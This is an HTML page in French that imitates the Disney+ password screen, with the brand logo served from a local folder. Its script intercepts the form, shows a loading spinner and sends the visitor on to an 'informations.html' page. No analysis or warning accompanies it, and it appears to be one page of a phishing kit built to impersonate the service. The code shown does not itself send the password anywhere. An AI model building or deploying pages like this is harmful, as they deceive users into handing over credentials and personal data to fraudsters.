<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Mot de passe | Disney+</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: radial-gradient(circle at top, #003264 0%, #032541 100%);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo {
      margin-top: 40px;
      width: 130px;
    }

    main {
      background-color: #fff;
      color: #000;
      width: 100%;
      max-width: 400px;
      border-radius: 16px;
      padding: 30px 24px;
      margin: 30px 20px;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
      text-align: center;
    }

    h1 {
      font-size: 1.5rem;
      margin-bottom: 20px;
      font-weight: 500;
    }

    input[type="password"] {
      width: 100%;
      padding: 14px;
      font-size: 1rem;
      border-radius: 6px;
      border: 1px solid #ccc;
      background-color: #f8f8f8;
      margin-bottom: 22px;
      box-sizing: border-box;
      transition: border-color 0.2s ease;
    }

    input[type="password"]:focus {
      border-color: #1a73e8;
      outline: none;
      background-color: #fff;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #000;
      color: #fff;
      font-weight: bold;
      font-size: 1rem;
      border: none;
      border-radius: 999px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #333;
    }

    /* Spinner Overlay */
    #spinnerOverlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.9);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      display: none;
    }

    .spinner {
      width: 70px;
      height: 70px;
      border: 8px solid rgba(255, 255, 255, 0.1);
      border-top: 8px solid #00bfff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @media (max-width: 480px) {
      .logo {
        width: 100px;
        margin-top: 30px;
      }

      main {
        padding: 25px 18px;
      }

      h1 {
        font-size: 1.4rem;
      }
    }
  </style>
</head>
<body>

  <img src="Images/compose2.png" alt="Disney+" class="logo" />

  <main>
    <h1>Entrez votre mot de passe</h1>

    <form id="passwordForm">
      <input type="password" placeholder="Mot de passe" required />
      <button type="submit">Continuer</button>
    </form>
  </main>

  <!-- Spinner Overlay -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <script>
    document.getElementById("passwordForm").addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("spinnerOverlay").style.display = "flex";
      setTimeout(() => {
        window.location.href = "informations.html";
      }, 2500);
    });
  </script>

</body>
</html>
